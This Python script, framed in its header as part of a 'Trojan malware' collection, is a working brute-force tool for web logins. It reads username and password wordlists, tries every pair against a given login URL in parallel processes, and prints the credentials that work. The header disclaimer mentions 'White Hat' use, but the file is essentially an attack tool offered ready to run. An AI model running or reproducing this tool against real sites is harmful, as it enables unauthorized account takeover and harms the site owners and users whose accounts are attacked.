#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 5th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# Important note update the script to just run on the target ip address so it doesn't ask for an input!
# The script is a multi-platform Python tool designed for automating the brute force login 
# process on web applications. It prompts the user to input the login URL, as well as the paths to 
# files containing lists of usernames and passwords. The script then iterates through all combinations 
# of usernames and passwords, attempting to log in to the specified URL. It utilizes multiprocessing
# to parallelize the login attempts, enhancing efficiency. Upon successful login, the script outputs
# the corresponding credentials, while also providing feedback on failed attempts. This versatile 
# tool can be used across both Windows and Linux operating systems, providing a flexible solution 
# for testing and securing web applications.
#################################################################################################
import os
import requests
import multiprocessing

def read_credentials(filename):
    """Reads usernames or passwords from the given file."""
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def brute_force_login(login_url, username, password):
    # Create a session to maintain cookies
    session = requests.Session()

    # Define the login payload with the current username and password
    payload = {
        'username': username,
        'password': password
    }

    # Attempt to login using the current credentials
    response = session.post(login_url, data=payload)

    # Check if login was successful
    if 'Login failed' not in response.text:
        print(f'Successful login with username: {username} and password: {password}')
        return username, password  # Return the successful credentials
    else:
        print(f'Failed login attempt with username: {username} and password: {password}')

    # Close the session
    session.close()
    return None, None

def brute_force(logins):
    for login in logins:
        username, password = brute_force_login(*login)
        if username and password:
            return username, password  # If successful, return the credentials
    return None, None  # If no valid credentials were found

if __name__ == "__main__":
    url_login = input("Please Enter login URL here: ")

    # Prompt the user for the paths to the usernames and passwords files
    users_file = input('Please enter the path to your usernames dictionary: ')
    pass_file = input('Please enter the path to your passwords dictionary: ')

    # Convert paths to absolute paths to ensure compatibility across platforms
    users_file = os.path.abspath(users_file)
    pass_file = os.path.abspath(pass_file)

    usernames = read_credentials(users_file)
    passwords = read_credentials(pass_file)

    # Create a list of login attempts with all combinations of usernames and passwords
    login_attempts = [(url_login, username, password) for username in usernames for password in passwords]

    # Split login attempts into chunks for multiprocessing
    num_processes = multiprocessing.cpu_count()
    chunks = [login_attempts[i::num_processes] for i in range(num_processes)]

    # Create processes to execute login attempts
    processes = []
    for chunk in chunks:
        p = multiprocessing.Process(target=brute_force, args=(chunk,))
        p.start()
        processes.append(p)

    # Wait for all processes to finish
    for p in processes:
        p.join()

    print("Brute force login completed.")

